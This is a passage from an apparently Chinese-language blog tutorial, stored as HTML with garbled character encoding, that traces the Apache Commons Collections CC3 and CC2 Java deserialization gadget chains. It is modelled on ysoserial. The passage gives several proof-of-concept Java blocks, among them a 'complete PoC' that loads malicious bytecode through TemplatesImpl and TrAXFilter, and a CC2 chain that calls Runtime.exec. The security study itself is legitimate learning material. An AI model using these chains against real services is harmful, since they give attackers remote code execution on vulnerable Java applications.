æ–¹æ³•æ²¡æœ‰æ˜¾å¼å£°æ˜ä½œç”¨åŸŸï¼Œå…¶ä½œç”¨åŸŸä¸ºdefaultã€‚æ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œçš„ defineClass ç”±å…¶çˆ¶ç±»çš„ protectedç±»å‹å˜æˆäº†ä¸€ä¸ªdefaultç±»å‹çš„æ–¹æ³•ï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨ã€‚<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663398722-55450f8c-336f-4160-9cb6-fb68b2367e15.png"></p><p>ä½†æ˜¯æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªè¯¥ç±»ä¸€ä¸ªpublicç±»å‹æ¥è¿›è¡Œè°ƒç”¨è¯¥æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663560670-d044b685-2961-437d-9c2a-a31d628255f9.png">æˆ‘ä»¬åå‘è·Ÿè¸ªåœ¨defineTransletClassesä¸­è°ƒç”¨äº†è¯¥æ–¹æ³•ï¼Œéœ€è¦_bytecodesä¸ä¸ºç©ºï¼Œå…¶å®è¿™ä¸ªå±æ€§å°±æ˜¯æˆ‘ä»¬è¦ä¼ å…¥çš„å­—èŠ‚ç ä½†æ˜¯è¿˜ä¸èƒ½è°ƒç”¨éœ€è¦ç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663667380-3fba4569-64f0-44c6-8109-40b9ad24962d.png"></p><p>æ‰¾åˆ°äº†getTransletInstanceæ–¹æ³•å¹¶ä¸”å…¶å±æ€§_nameä¸èƒ½ä¸ºç©º _classéœ€è¦ä¸ºç©ºæ‰å¯ä»¥è°ƒç”¨ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸èƒ½åœ¨å¤–éƒ¨è°ƒç”¨éœ€è¦ç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663736056-8819d01c-e84c-4813-b5a3-4f98c449fd25.png"></p><p>æœ€ç»ˆæ‰¾åˆ°äº†newTransformeræ–¹æ³•æ˜¯publicç±»å‹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å®ä¾‹åŒ–TemplatesImplå¯¹è±¡è°ƒç”¨newTransformeræ–¹æ³•æ¥è§¦å‘defineclassåŠ è½½å­—èŠ‚ç ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦çœ‹ä¸€ä¸‹TemplatesImplæ„é€ æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663912873-86f895fb-445f-4457-b20d-6b315e042693.png"></p><p>å‘ç°å¹¶æ²¡ç”¨è¿›è¡Œä»»ä½•èµ‹å€¼æ‰€ä»¥æˆ‘ä»¬éœ€è¦è‡ªå·±æ‰‹åŠ¨è¿›è¡Œåå°„èµ‹å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å– class å¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¸‹é¢æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸€äº›å˜é‡</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è§¦å‘æ–¹æ³•</span></span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure><p>è¿è¡Œå‘ç°ç©ºæŒ‡é’ˆé”™è¯¯ï¼Œé€šè¿‡è°ƒè¯•å‘ç°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664277730-268e14ac-7775-4c4f-b300-2ac2366302ae.png"></p><p>_tfactoryä¸ºç©ºæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»™å…¶ä¼ å…¥å€¼ï¼Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664331886-af671cab-f9c8-446d-a443-5829c7d7f385.png"></p><p>é€šè¿‡æŸ¥çœ‹å‘ç°å…¶æ˜¯transientç±»å‹æ˜¯ä¸å¯åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡äº§çœ‹readObjectä¸­çœ‹çœ‹æ˜¯ç»™å…¶èµ‹å€¼çš„ä»€ä¹ˆå°±ç»™ä»–èµ‹å€¼ä»€ä¹ˆå°±å¯ä»¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664419837-1a271fc1-9a92-4754-a71d-4bea2f9f6eee.png"></p><p>æ‰€ä»¥é‡æ–°æ„é€ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bbyte[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å– class å¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¸‹é¢æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸€äº›å˜é‡</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è§¦å‘æ–¹æ³•</span></span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿è¡Œä¹‹åå‘ç°è¿˜æ˜¯æŠ¥é”™</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664557971-bc6614a1-c6ac-46ba-93da-c9270ba0cc09.png"></p><p>åŸå› æ˜¯åœ¨åŠ è½½å­—èŠ‚ç ä¹‹åæœ‰ä¸€ä¸ªæ–¹æ³•æŸ¥çœ‹å­—èŠ‚ç çš„çˆ¶ç±»æ˜¯å¦æ˜¯<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664601418-b93e8e9d-23be-46c0-9744-cc79bf454422.png"></p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦è®©æˆ‘ä»¬çš„æ¶æ„ç±»ç»§æ‰¿è¯¥ç±»ä¹‹åå°±å¯ä»¥è¿è¡Œäº†ã€‚</p><p>ç„¶åæˆ‘ä»¬å’Œä¹‹å‰çš„cc1é“¾å‰é¢ç»“åˆä¸€ä¸‹å°±å¯ä»¥æˆä¸ºä¸€ä¸ªé“¾äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">// è·å– class å¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">// ä¸‹é¢æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸€äº›å˜é‡</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è§¦å‘æ–¹æ³•</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(1);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;className&quot;</span>,<span class="string">&quot;aass&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ transformedmapæ˜¯è°ƒç”¨tranform()çš„å‰ç½®æ¡ä»¶</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–sun.reflect.annotation.AnnotationInvocationHandlerç±»çš„Classå¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(FaultAction.class, transformedMap);</span><br><span class="line">        <span class="comment">//serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬é€šè¿‡æŸ¥çœ‹ysoserialä½œè€…å‘ç°å…¶æ„é€ çš„é“¾è·Ÿæˆ‘ä»¬ä¸ä¸€æ ·ï¼Œä»–æ²¡æœ‰ç”¨è¿™ä¸ªInvokerTransformerå»è§¦å‘ï¼ŒåŸå› å°±æ˜¯å› ä¸ºå¯èƒ½æœ‰äº›wafä¼šå¯¹InvokerTransformeråšäº†é»‘åå•é™åˆ¶å¯¼è‡´ä¸èƒ½å¤Ÿä½¿ç”¨äº†ã€‚</p><p>æ‰€ä»¥ysoserialä½œè€…å‘ç°äº†com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter ã€‚ è¿™ä¸ªç±»çš„æ„é€ â½…æ³•ä¸­è°ƒâ½¤äº† (TransformerImpl) templates.newTransformer() ï¼Œå…å»äº†æˆ‘ä»¬ä½¿â½¤ InvokerTransformerâ¼¿â¼¯è°ƒâ½¤ newTransformer() â½…æ³•è¿™â¼€æ­¥ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714666476954-c09853ee-7994-4d00-978e-9e7cc10e2c93.png"></p><p>ä½†æ˜¯å‘¢ç”±äºè¯¥ç±»æ˜¯ä¸å¯ä»¥è¢«åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½é€šè¿‡å¯¹å…¶åå°„è·å–classå¯¹è±¡å¯¹å…¶è¿›è¡Œèµ‹å€¼ï¼Œè¿™é‡Œä½œè€…ysoserialæ‰¾åˆ°ä¸€ä¸ªInstantiateTransformerç±»ä»–å®ç°äº†transformer Serializableæ¥å£ï¼Œåœ¨å®ƒçš„transform()æ–¹æ³•ä¸­ï¼Œåˆ¤æ–­äº†inputå‚æ•°æ˜¯å¦ä¸ºClassï¼Œè‹¥æ˜¯Classï¼Œåˆ™é€šè¿‡åå°„å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡å¹¶è¿”å›ï¼›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714667122114-6b707d16-67b2-4975-b70f-a170a58e559d.png"></p><p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨InstantiateTransformerçš„transformæ–¹æ³•æ¥è§¦å‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">// è·å– class å¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">// ä¸‹é¢æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸€äº›å˜é‡</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure><p>å®Œæ•´poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">       <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">       <span class="comment">// è·å– class å¯¹è±¡</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">       <span class="comment">// ä¸‹é¢æ˜¯éœ€è¦ä¿®æ”¹çš„ä¸€äº›å˜é‡</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">       classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">       bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// è§¦å‘æ–¹æ³•</span></span><br><span class="line">       Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span> [] &#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span> [] &#123;templates&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">       <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">       <span class="comment">//chainedTransformer.transform(1);</span></span><br><span class="line">       <span class="comment">/*InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);</span></span><br><span class="line"><span class="comment">       instantiateTransformer.transform(TrAXFilter.class);*/</span></span><br><span class="line">       HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">       map.put(<span class="string">&quot;className&quot;</span>,<span class="string">&quot;aass&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//æ„é€ transformedmapæ˜¯è°ƒç”¨tranform()çš„å‰ç½®æ¡ä»¶</span></span><br><span class="line">       Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">               map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// è·å–sun.reflect.annotation.AnnotationInvocationHandlerç±»çš„Classå¯¹è±¡</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">       <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">       constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(FaultAction.class, transformedMap);</span><br><span class="line">       <span class="comment">//serialize(o);</span></span><br><span class="line">       unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714669560414-6960b378-e64f-44d0-9074-f683ae520ea9.pdf">Javaå®‰å…¨æ¼«è°ˆ - 14.ä¸ºä»€ä¹ˆéœ€è¦CommonsCollections3.pdf</a></p><p><a href="https://blog.csdn.net/weixin_54648419/article/details/123376523">https://blog.csdn.net/weixin_54648419&#x2F;article&#x2F;details&#x2F;123376523</a></p><h3 id="cc3è°ƒç”¨é“¾"><a href="#cc3è°ƒç”¨é“¾" class="headerlink" title="cc3è°ƒç”¨é“¾"></a>cc3è°ƒç”¨é“¾</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714669437495-5c7c2b2f-a311-4a6d-b4d7-77283e919462.png"></p><h2 id="java-cc2é“¾"><a href="#java-cc2é“¾" class="headerlink" title="java cc2é“¾"></a>java cc2é“¾</h2><p>é€šè¿‡ysoçš„ä»£ç å¯ä»¥çœ‹å‡ºï¼Œcc2åˆ©ç”¨é“¾ç”¨çš„æ˜¯commons-collections4ç‰ˆæœ¬ï¼Œè€Œæˆ‘ä»¬ä¹‹å‰ç”¨çš„æ˜¯3.1ç‰ˆæœ¬ã€‚æ‰€ä»¥é¦–å…ˆè¦ä¸‹è½½ä¸€ä¸‹ä¾èµ–ï¼Œpomæ–‡ä»¶åŠ å…¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="è°ƒç”¨æ–¹å¼1ï¼š"><a href="#è°ƒç”¨æ–¹å¼1ï¼š" class="headerlink" title="è°ƒç”¨æ–¹å¼1ï¼š"></a>è°ƒç”¨æ–¹å¼1ï¼š</h3><p>ç„¶åå°±æ˜¯ä»–å‰åŠéƒ¨åˆ†çš„è°ƒç”¨é“¾å˜äº†å…ˆæ¥çœ‹ä¸€ä¸‹poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaintransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chaintransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);<span class="comment">//åˆ›å»ºå®ä¾‹ã€‚æ³¨æ„ä¸‹é¢çš„é¡ºåºæ”¹å˜äº†ã€‚</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span 